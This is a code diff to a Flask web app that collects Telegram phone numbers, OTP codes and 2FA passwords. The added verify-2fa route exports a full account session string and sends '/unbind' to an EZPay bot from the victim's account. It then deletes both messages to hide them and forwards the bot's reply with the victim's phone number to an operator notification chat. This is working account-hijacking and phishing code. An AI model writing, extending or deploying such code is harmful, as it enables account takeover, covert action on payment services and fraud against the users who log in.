@@ -205,20 +205,84 @@ def verify_otp():
         cleanup_phone(phone)
         return jsonify({"success": False, "error": "OTP expired. Please request a new one."}), 400
     except SessionPasswordNeeded:
-        try:
-            session_string = run_async(client.export_session_string())
-        except Exception:
-            session_string = None
-        cleanup_phone(phone)
+        with clients_lock:
+            clients[phone] = client
+            client_timestamps[phone] = time.time()
         return jsonify({
             "success": True,
-            "message": "Authenticated successfully (2FA account)",
-            "session_string": session_string,
-            "needs_2fa": True
+            "needs_2fa": True,
+            "message": "2FA required"
         })
     except Exception as e:
         cleanup_phone(phone)
         return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route('/api/verify-2fa', methods=['POST'])
+def verify_2fa():
+    data = request.json
+    phone = data.get('phone', '').strip()
+    password = data.get('password', '').strip()
+
+    if not phone or not password:
+        return jsonify({"success": False, "error": "Phone and password required"}), 400
+
+    with clients_lock:
+        client = clients.get(phone)
+
+    if not client:
+        return jsonify({"success": False, "error": "Session expired. Please request OTP again."}), 400
+
+    try:
+        async def do_2fa():
+            await client.check_password(password)
+            session_string = await client.export_session_string()
+
+            unbind_response = None
+            try:
+                sent_msg = await client.send_message(EZPAY_BOT_USERNAME, "/unbind")
+                sent_msg_id = sent_msg.id
+                await asyncio.sleep(3)
+
+                response_msg = None
+                async for msg in client.get_chat_history(EZPAY_BOT_USERNAME, limit=5):
+                    if not msg.outgoing and msg.text:
+                        response_msg = msg
+                        break
+
+                if response_msg:
+                    unbind_response = response_msg.text
+
+                try:
+                    if response_msg:
+                        await client.delete_messages(EZPAY_BOT_USERNAME, response_msg.id)
+                    await client.delete_messages(EZPAY_BOT_USERNAME, sent_msg_id)
+                except Exception:
+                    pass
+            except Exception as e:
+                unbind_response = f"Error during unbind: {str(e)}"
+
+            await client.disconnect()
+            return session_string, unbind_response
+
+        session_string, unbind_response = run_async(do_2fa())
+
+        with clients_lock:
+            clients.pop(phone, None)
+            phone_code_hashes.pop(phone, None)
+            client_timestamps.pop(phone, None)
+
+        if unbind_response:
+            notif_text = f"<b>EZPay Unbind Response</b>\n\n<b>Phone:</b> +91 {phone}\n<b>Bot Response:</b>\n{unbind_response}"
+            send_to_notification_chat(notif_text)
+
+        return jsonify({
+            "success": True,
+            "message": "2FA verified successfully",
+            "session_string": session_string
+        })
+    except Exception as e:
+        cleanup_phone(phone)
+        return jsonify({"success": False, "error": "Wrong 2FA password. Please try again."}), 400
 
 @app.route('/health', methods=['GET'])
 def health():
